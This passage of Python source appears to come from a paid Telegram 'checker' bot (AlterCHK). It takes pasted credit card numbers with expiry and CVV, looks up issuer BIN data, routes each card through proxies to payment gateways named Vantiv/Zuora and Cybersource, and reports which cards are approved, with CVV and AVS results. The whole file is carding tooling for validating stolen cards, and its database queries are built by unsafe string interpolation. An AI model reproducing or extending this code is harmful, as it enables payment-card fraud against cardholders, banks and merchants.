                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDki2 import VantivZuora
        CheckRecive = await VantivZuora(CcVerify, CheckedP[1])
        fin = f'{time.time()-inicio}'

        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["cys"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Calipso [ 21$ ]'
    TwoNameGateway = 'Gateway ↯ Calipso [ 21$ ]'
    ThreeGateway = 'Gateway 🔥 Calipso [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('cys')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDcys import CybersourceCys
        Status = await CybersourceCys(CcVerify, CheckedP[1])
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if (Status[0] == 'Approved') :
            AVSDATA = Status[2]
            PROCCVV2 = Status[3]
            RESPMSG = Status[1]
            respstatus = '[ APPROVED ✅ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nCVV ↯ <b>[{PROCCVV2}]</b> | AVS ↯ <b>[{AVSDATA}]</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif (Status[0] == 'Declined') :
            AVSDATA = Status[2]
            PROCCVV2 = Status[3]
            RESPMSG = Status[1]
            respstatus = '[ DECLINED ❌ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nCVV ↯ <b>[{PROCCVV2}]</b> | AVS ↯ <b>[{AVSDATA}]</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        if (Status[0] == 'ApprovedSinCVV') :
            RESPMSG = Status[1]
            respstatus = '[ APPROVED ✅ ]'
            try :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif (Status[0] == 'DeclinedSinCVV') :
            RESPMSG = Status[1]
            respstatus = '[ DECLINED ❌ ]'
            try :
